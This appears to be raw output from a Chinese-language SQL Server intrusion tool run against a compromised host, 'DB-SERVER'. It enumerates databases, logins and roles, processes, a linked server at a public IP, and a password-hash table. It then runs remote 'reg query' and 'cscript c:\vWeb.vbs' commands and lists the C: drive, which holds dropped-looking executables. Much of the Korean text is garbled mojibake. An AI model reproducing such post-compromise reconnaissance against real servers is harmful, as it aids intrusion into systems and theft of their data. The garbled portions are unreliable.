+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+data_eyerank	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_eyerank.mdf	
+data_eyerank_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_eyerank_NURI.mdf	
+data_forest_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_forest_NURI.mdf	
+data_forest_OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_forest_OnMiner_Data.mdf	
+data_hplus_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_hplus_NURI.mdf	
+data_hplus_OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_hplus_OnMiner_Data.mdf	
+data_Kimth	C:\Program Files\Microsoft SQL Server\MSSQL\Data\data_Kimth.mdf	
+data_kimth1	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_kimth1.mdf	
+data_kimth11	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_kimth11.mdf	
+data_kimth2	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_kimth2.mdf	
+data_kimth20	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_kimth20.mdf	
+data_kimth9	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_kimth9.mdf	
+data_media	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_media.mdf	
+data_onminer	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_onminer.mdf	
+data_ournews_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_ournews_NURI.mdf	
+data_roadweb_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_roadweb_NURI_Data.mdf	
+data_roadweb_OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_roadweb_OnMiner_Data.mdf	
+data_sociallink	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_sociallink.mdf	
+data_spoool_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_spoool.mdf	
+data_test	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_test.mdf	
+data_test2	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_test2.mdf	
+data_test3	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_test3.mdf	
+data_tgicon	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_tgicon.mdf	
+data_troject	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_troject.mdf	
+data_wgwg_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_wgwg_NURI_Data.mdf	
+data_wgwg_OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_wgwg_OnMiner_Data.mdf	
+data_wonjin	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_wonjin.mdf	
+data_wstory	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_wstory.mdf	
+data_wstory_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_wstory_NURI.mdf	
+ER_Intra	C:\Program Files\Microsoft SQL Server\MSSQL\data\ER_Intra.mdf	
+EyeSpy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EyeSpy_Data.MDF	
+Hoon	C:\Program Files\Microsoft SQL Server\MSSQL\data\Hoon.mdf	
+KERIDB	C:\Program Files\Microsoft SQL Server\MSSQL\data\KERIDB_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+MD_SpyMgr	C:\Program Files\Microsoft SQL Server\MSSQL\data\SW_SpyMgr.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+mogaha	C:\Program Files\Microsoft SQL Server\MSSQL\data\mogaha_Data.MDF	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+New	C:\Program Files\Microsoft SQL Server\MSSQL\data\New_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\OnMiner.mdf	
+OpenData	C:\Program Files\Microsoft SQL Server\MSSQL\data\OpenData.mdf	
+page_access	C:\Program Files\Microsoft SQL Server\MSSQL\data\page_access.mdf	
+pas	C:\Program Files\Microsoft SQL Server\MSSQL\Data\PAS.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+ReportServer	C:\Program Files\Microsoft SQL Server\MSSQL\data\ReportServer.mdf	
+ReportServerTempDB	C:\Program Files\Microsoft SQL Server\MSSQL\data\ReportServerTempDB.mdf	
+RoadWeb	C:\Program Files\Microsoft SQL Server\MSSQL\Data\RoadWeb.mdf	
+Spy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Spy_Data.MDF	
+SpyMain	C:\Program Files\Microsoft SQL Server\MSSQL\Data\SpyMain.mdf	
+SpyMgr	C:\Program Files\Microsoft SQL Server\MSSQL\data\SpyMgr.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+TestDB	C:\Program Files\Microsoft SQL Server\MSSQL\Data\TestDB_Data.MDF	
+TestDB2	C:\Program Files\Microsoft SQL Server\MSSQL\data\TestDB2.mdf	
+tgicon	C:\Program Files\Microsoft SQL Server\MSSQL\data\tgicon_Data.mdf	
+tgicon1	C:\Program Files\Microsoft SQL Server\MSSQL\data\tgicon1.mdf	
+tgicon2	C:\Program Files\Microsoft SQL Server\MSSQL\data\tgicon2.mdf	
+WAURANK_MAIN	C:\Program Files\Microsoft SQL Server\MSSQL\data\WAURANK_MAIN.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.馄?熑?????	08  6 2000  1:27AM	
+dbo			08  6 2000  1:27AM	
+guest		.	08  6 2000  1:27AM	
+DB-SERVER\SQLServer2005MSFTEUser$DB-SERVER$MSSQLSERVER		?..?.??辆甀???.	01 10 2008  1:56PM	
+##MS_AgentSigningCertificate##		?..?.???鞘?????	01 23 2009  9:44AM	
+RSExecRole		?..?.?琁?緹??棑	01 10 2008  2:03PM	
+NT AUTHORITY\NETWORK SERVICE		?..?.	01 10 2008  2:03PM	
+NT AUTHORITY\SYSTEM		?..?.	01 10 2008  2:03PM	
+eyerank		艝????扝姏伌	03 20 2008 10:09AM	
+db_owner		?..?.......?.	08  6 2000  1:27AM	
+db_accessadmin		?..?.......?.	08  6 2000  1:27AM	
+db_securityadmin		?..?.......?.	08  6 2000  1:27AM	
+db_ddladmin		?..?.......?.	08  6 2000  1:27AM	
+db_backupoperator		?..?.......?.	08  6 2000  1:27AM	
+db_datareader		?..?.......?.	08  6 2000  1:27AM	
+db_datawriter		?..?.......?.	08  6 2000  1:27AM	
+db_denydatareader		?..?.......?.	08  6 2000  1:27AM	
+db_denydatawriter		?..?.......?.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+TimeChecker 览侩 橇肺弊伐	sleeping	COM2-01	2996	AWAITING COMMAND		
+TimeChecker 览侩 橇肺弊伐	sleeping	COM2-01	2996	AWAITING COMMAND		
+TimeChecker 览侩 橇肺弊伐	sleeping	COM2-01	2996	AWAITING COMMAND		
+TimeChecker 览侩 橇肺弊伐	sleeping	COM2-01	2996	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB-SERVER	SQL Server	SQLOLEDB	DB-SERVER		DB-SERVER	
+121.125.73.42	SQL Server	SQLOLEDB	121.125.73.42		121.125.73.42	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■cscript c:\vWeb.vbs
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4	c:\vWeb.vbs(23, 16) Microsoft VBScript 哪颇老 坷幅: 'for' 风橇 牧飘费 函荐啊 肋给登菌嚼聪促.	
+5		
+6		
+■通过读取注册表获取的网站根目录：
+Dir of E:: 
+
+
+Dir of C:: 
+
+467ad90fd1047695940ed69ceaf18e\
+9f6a181ecd46339389651308c1ec960e\
+BackUp\
+baf5dc9fd13b6e148c8add\
+BULK_INSERT\
+Config.Msi\
+Data\
+DBMgr\
+Documents and Settings\
+Inetpub\
+Intel\
+Log\
+MySQL\
+OnMiner\
+Oracle\
+Program Files\
+RECYCLER\
+sybase\
+System Volume Information\
+Temp\
+TempEI4\
+WINDOWS\
+wmpub\
+Work\
+WUTemp\
+AUTOEXEC.BAT
+CONFIG.SYS
+csf_bbs_data.csv
+csf_bbs_data.xls
+csf_bbs_data2.xls
+do.exet
+intelinstall.log
+iobw.tst
+M.BIN
+m.exe
+Roadweb.zip
+spoool_090312.xls
+SQLQuery8.sql
+SystemReqTest.log
+vWeb.vbs
+
